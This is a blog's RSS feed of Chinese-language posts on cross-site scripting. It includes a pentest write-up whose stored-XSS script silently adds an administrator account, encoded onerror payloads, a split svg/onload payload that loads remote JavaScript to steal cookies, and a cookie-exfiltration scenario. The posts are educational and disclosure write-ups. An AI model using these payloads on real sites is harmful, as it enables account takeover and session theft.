<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>xss on </title>
    <link>https://wyb0.com/tags/xss/</link>
    <description>Recent content in xss on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 14 Nov 2018 10:36:38 +0800</lastBuildDate>
    
	<atom:link href="https://wyb0.com/tags/xss/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>记一次渗透测试中利用存储型XSS添加用户</title>
      <link>https://wyb0.com/posts/2018/recording-an-xss-in-pentest/</link>
      <pubDate>Wed, 14 Nov 2018 10:36:38 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/recording-an-xss-in-pentest/</guid>
      <description> $(document).ready(function(){ window.location.href=&#39;https://wyb0.com/404.html&#39;; });  ``` ![80](/img/post/20181114-121432.png) 当用户yxk浏览用户申请列表页面时触发XSS ![80](/img/post/20181114-121938.png) 回到reber用户，可以看到已经加入了yxk的组织，可以进行一些操作了 ![80](/img/post/20181114-122147.png) ### 0x05 更进一步，添加为管理员 刚开始分析发现通过上面的过程先添加用户，然后再添加用户为管理员，比较麻烦 后续发现其实不用这么麻烦，直接用另外一个接口发送ajax请求就能直接添加管理员用户 添加管理员的2.js如下： ``` function get_gid(){ $.ajax({ type: &#39;post&#39;, url: &#39;/a/cms/group/treeNode&#39;, dataType: &#39;json&#39;, async: false, data: &#39;parentId=0&#39;, success: function(data){ gid = data[0][&#39;dataObject&#39;][&#39;topGroupId&#39;]; } }); return gid; } var gid = get_gid(); $.post(&#39;/a/cms/member/do.save&#39;,{memberId: 0,userId: &#39;&#39;,mobile: &#39;176004****&#39;,name: &#39;aaa&#39;,pinyin: &#39;aaa&#39;,groupId: 608863,group: &#39;默认分组&#39;,roleId: 2,duty: &#39;&#39;,sex: 0,sort: &#39;10000&#39;,&#39;TEL;CELL&#39;: &#39;&#39;,&#39;TEL;WORK&#39;: &#39;&#39;,EMAIL: &#39;&#39;}); ``` 提交验证信息为：```test``` 当yxk访问请求的list页面时即可直接添加新用户aaa到group并且是管理员账户： ![80](/img/post/20181114-123006.png) 好了，打完收工！  PS：漏洞已提交，并早在3个月前修复 -- </description>
    </item>
    
    <item>
      <title>XSS中的编码</title>
      <link>https://wyb0.com/posts/2017/xss-encode/</link>
      <pubDate>Thu, 30 Mar 2017 15:25:37 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2017/xss-encode/</guid>
      <description>0x00 浏览器解析 浏览器收到服务器发来的HTML内容，会从头解析，遇到&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;时， 会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容， 对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本， 在这之前它是HTML的一部分  0x01 一些编码  URL编码
%+字符的ASCII编码对应的两位十六进制，如&amp;quot;/&amp;quot;的url编码为&amp;quot;%2F&amp;quot;  HTML编码
 实体编码
&amp;amp;开头分号结尾，如 &amp;quot;&amp;lt;&amp;quot; 的编码是 &amp;quot;&amp;amp;lt;&amp;quot;  字符编码
样式为&amp;quot;&amp;amp;#数值;&amp;quot;，数值可为10进制、16进制ASCII编码或unicode字符编码 如&amp;quot;&amp;lt;&amp;quot;可编码为&amp;quot;&amp;amp;#060;&amp;quot;和&amp;quot;&amp;amp;#x3c;&amp;quot;，但是必须在属性值里面   JS编码
1、两个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\x3c&amp;quot; 2、三个八进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\074&amp;quot; 3、四个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\u003c&amp;quot; 4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）  CSS编码
反斜线(\)后跟1~6位的16进制数字，如&amp;quot;e&amp;quot;为&amp;quot;\65&amp;quot;或&amp;quot;65&amp;quot;或&amp;quot;00065&amp;quot;   0x02 编码与解码顺序 解码时先解码最外层，编码时先编码最内层
如&amp;lt;td onclick=&amp;quot;openUrl(add.do?userName=&#39;{$value}&#39;);&amp;quot;&amp;gt;11&amp;lt;/td&amp;gt;， 首先value出现在url中，而url在js中，而js又是html一部分，所以 解码顺序为：html解码-&amp;gt;js解码-&amp;gt;url解码 编码顺序为：url编码-&amp;gt;js编码-&amp;gt;html编码  0x03 利用  八进制
&amp;lt;p id=&amp;quot;test&amp;quot;&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; var test = &amp;quot;\74\151\155\147\40\163\162\143\75\170\40\157\156\145\162\162\157\162\75\141\154\145\162\164\50\61\51\76&amp;quot;; var p = document.getElementById(&#39;test&#39;); #这里会进行js解码 p.innerHTML = test; &amp;lt;/script&amp;gt;  十进制和十六进制
&amp;lt;img src=x onerror=&amp;quot;\u0061\u006c\u0065\u0072\u0074(1)&amp;quot;&amp;gt; &amp;lt;img src=x onerror=&amp;quot;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#49;&amp;amp;#41;&amp;quot;&amp;gt;  javascript协议</description>
    </item>
    
    <item>
      <title>一次存储型XSS利用实例</title>
      <link>https://wyb0.com/posts/2016/recording-an-stored-xss/</link>
      <pubDate>Sun, 17 Jul 2016 23:30:54 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/recording-an-stored-xss/</guid>
      <description> 首先感谢凯神的指导
0x00 注册账号 先得到一个临时邮箱，然后注册账号 0x01 找输入输出点 0x02 尝试构造payload payload用如下的即可：
&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;a  但是这个要在点击删除时payload才起作用 也可用&amp;lt;img src=1 onerror=alert(1) /&amp;gt;自动加载，但也要点击删除按钮才能起作用 但是我们若想充分利用则需要远程加载自己的js  0x03 加载自己的js  此时的限制条件为：  * 30个字符 * script标签不能自己触发   只能构造类似下面的语句自己加载脚本：  a=document.createElement(&#39;script&#39;); a.src=&amp;quot;www.xxx.com&amp;quot;; document.head.appendChild(a);   可以用如下方法分割，多次添加：  a=document.createE/* */lement(&#39;script&#39;);/* */a.src=&amp;quot;www.xxx.com&amp;quot;;/* */document.head.app/* */endChild(a); 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行   查找  构造payload   使用如下payload： &amp;lt;svg/onload=&amp;quot;b=&#39;http://t.i&#39;&amp;quot;&amp;gt; &amp;lt;svg/onload=&amp;quot;b+=&#39;m/16ap6&#39;&amp;quot;&amp;gt; &amp;lt;svg/onload=&amp;quot;$loadJs(b)&amp;quot;&amp;gt;  0x04 得到Cookie </description>
    </item>
    
    <item>
      <title>XSS漏洞及其挖掘方法</title>
      <link>https://wyb0.com/posts/2016/xss-basis-and-use/</link>
      <pubDate>Fri, 15 Jul 2016 10:30:54 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/xss-basis-and-use/</guid>
      <description>0x00 简介 XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&amp;rdquo;脚本&amp;rdquo;这两个字上，脚本主要有两个：JavaScript和ActionScript。
要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。
0x01 危害 JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。
• 盗取管理员Cookie • XSS Worm • 挂马(水坑攻击) • 键盘记录(有局限性) • 利用网站重定向 • 修改网页内容 • 等等  0x02 攻击场景 在各类SNS、邮件系统、开源流行的Web应用、BBS、微博等社交场景中，前端攻击被广泛实施与关注。主要是一些大型网站才有价值。
• 支持html解析和javascript解析的客户端,如：html文档、flsh、pdf等 • url的参数，回显到网页上 • form表单提交的内容出现在网页上，如：昵称、邮箱、简介、留言 • 等等  0x03 分类 主要分为三类：反射型、存储型、DOM型(还有flash XSS、mXSS)。
 反射型XSS
  反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。
简单流程： 1. 用户访问带有XSS代码的URL请求 2. 服务器端接收数据后处理，然后返回带有XSS代码的数据发送给浏览器 3. 浏览器解析带有XSS代码的数据后，最终造成XSS漏洞 可能攻击流程： 1. 用户aaa在网站www.xxx.com浏览网页 2. 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码， 3. 构造的代码的功能为盗取用户Cookie并发送到指定站点www.xxser.com 4. hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击 5. 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com 6. hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息   存储型XSS
  存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。</description>
    </item>
    
  </channel>
</rss>